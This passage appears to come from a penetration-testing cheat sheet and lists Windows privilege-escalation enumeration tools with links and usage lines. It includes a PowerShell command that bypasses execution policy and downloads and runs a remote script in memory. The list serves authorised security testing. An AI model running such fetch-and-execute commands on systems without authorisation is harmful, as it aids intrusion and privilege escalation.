## Tools

-   [PowerSploit’s PowerUp](https://github.com/PowerShellMafia/PowerSploit)
    
    ```
      powershell -Version 2 -nop -exec bypass IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1'); Invoke-AllChecks
    ```
    
-   [Watson - Watson is a (.NET 2.0 compliant) C# implementation of Sherlock](https://github.com/rasta-mouse/Watson)
-   [BeRoot - Privilege Escalation Project - Windows / Linux / Mac](https://github.com/AlessandroZ/BeRoot)

-   [Windows-Exploit-Suggester](https://github.com/GDSSecurity/Windows-Exploit-Suggester)
    
    ```
      ./windows-exploit-suggester.py --update
      ./windows-exploit-suggester.py --database 2014-06-06-mssb.xlsx --systeminfo win7sp1-systeminfo.txt 
    ```
    
-   [windows-privesc-check - Standalone Executable to Check for Simple Privilege Escalation Vectors on Windows Systems](https://github.com/pentestmonkey/windows-privesc-check)
-   [WindowsExploits - Windows exploits, mostly precompiled. Not being updated.](https://github.com/abatchy17/WindowsExploits)
-   [WindowsEnum - A Powershell Privilege Escalation Enumeration Script.](https://github.com/absolomb/WindowsEnum)
-   [Seatbelt - A C# project that performs a number of security oriented host-survey “safety checks” relevant from both offensive and defensive security perspectives.](https://github.com/GhostPack/Seatbelt)
-   [Powerless - Windows privilege escalation (enumeration) script designed with OSCP labs (legacy Windows) in mind](https://github.com/M4ximuss/Powerless)
-   [JAWS - Just Another Windows (Enum) Script](https://github.com/411Hall/JAWS)
    
    ```
      powershell.exe -ExecutionPolicy Bypass -File .\jaws-enum.ps1 -OutputFilename JAWS-Enum.txt
    ```